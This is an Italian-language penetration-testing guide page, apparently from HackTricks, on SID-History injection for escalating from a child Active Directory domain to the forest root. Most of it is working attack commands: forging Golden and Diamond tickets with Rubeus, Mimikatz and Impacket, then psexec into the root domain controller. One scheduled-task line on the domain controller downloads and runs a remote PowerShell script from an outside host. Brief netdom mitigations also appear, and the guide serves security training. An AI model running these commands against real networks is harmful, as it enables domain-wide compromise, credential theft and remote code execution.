# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## Attacco di Iniezione della Storia SID

L'obiettivo dell'**Attacco di Iniezione della Storia SID** è facilitare **la migrazione degli utenti tra domini** garantendo al contempo l'accesso continuo alle risorse del precedente dominio. Questo viene realizzato **incorporando il precedente Identificatore di Sicurezza (SID) dell'utente nella Storia SID** del loro nuovo account. È importante notare che questo processo può essere manipolato per concedere accesso non autorizzato aggiungendo il SID di un gruppo ad alta privilegio (come gli Enterprise Admins o i Domain Admins) dal dominio principale alla Storia SID. Questa sfruttamento conferisce accesso a tutte le risorse all'interno del dominio principale.

Esistono due metodi per eseguire questo attacco: attraverso la creazione di un **Golden Ticket** o di un **Diamond Ticket**.

Per individuare il SID per il gruppo **"Enterprise Admins"**, è necessario prima localizzare il SID del dominio radice. Dopo l'identificazione, il SID del gruppo Enterprise Admins può essere costruito aggiungendo `-519` al SID del dominio radice. Ad esempio, se il SID del dominio radice è `S-1-5-21-280534878-1496970234-700767426`, il SID risultante per il gruppo "Enterprise Admins" sarebbe `S-1-5-21-280534878-1496970234-700767426-519`.

Puoi anche utilizzare i gruppi **Domain Admins**, che termina in **512**.

Un altro modo per trovare il SID di un gruppo dell'altro dominio (ad esempio "Domain Admins") è con:
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> Nota che è possibile disabilitare la cronologia SID in una relazione di fiducia, il che farà fallire questo attacco.

Secondo la [**documentazione**](https://technet.microsoft.com/library/cc835085.aspx):
- **Disabilitare SIDHistory su trust di foresta** utilizzando lo strumento netdom (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
- **Applicare il quarantining del filtro SID a trust esterni** utilizzando lo strumento netdom (`netdom trust /domain: /quarantine:yes on the domain controller`)
- **Applicare il filtro SID a trust di dominio all'interno di una singola foresta** non è raccomandato poiché è una configurazione non supportata e può causare cambiamenti critici. Se un dominio all'interno di una foresta non è affidabile, allora non dovrebbe essere un membro della foresta. In questa situazione è necessario prima separare i domini fidati e non fidati in foreste separate dove il filtro SID può essere applicato a un trust interforesta.

Controlla questo post per ulteriori informazioni su come bypassare questo: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

### Diamond Ticket (Rubeus + KRBTGT-AES256)

L'ultima volta che ho provato questo ho dovuto aggiungere l'argomento **`/ldap`**.
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### Golden Ticket (Mimikatz) con KRBTGT-AES256
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
Per ulteriori informazioni sui golden tickets controlla:

{{#ref}}
golden-ticket.md
{{#endref}}


Per ulteriori informazioni sui diamond tickets controlla:

{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
Esegui l'escalation a DA di root o Enterprise admin utilizzando l'hash KRBTGT del dominio compromesso:
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
Con i permessi acquisiti dall'attacco, puoi eseguire ad esempio un attacco DCSync nel nuovo dominio:

{{#ref}}
dcsync.md
{{#endref}}

### Da linux

#### Manuale con [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)

Questo è uno script Impacket che **automatizza l'innalzamento dal dominio child al dominio parent**. Lo script richiede:

- Domain controller di destinazione
- Credenziali per un utente admin nel dominio child

Il flusso è:

- Ottiene il SID per il gruppo Enterprise Admins del dominio parent
- Recupera l'hash per l'account KRBTGT nel dominio child
- Crea un Golden Ticket
- Effettua il login nel dominio parent
- Recupera le credenziali per l'account Administrator nel dominio parent
- Se l'opzione `target-exec` è specificata, si autentica al Domain Controller del dominio parent tramite Psexec.
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## Riferimenti

- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)

{{#include ../../banners/hacktricks-training.md}}
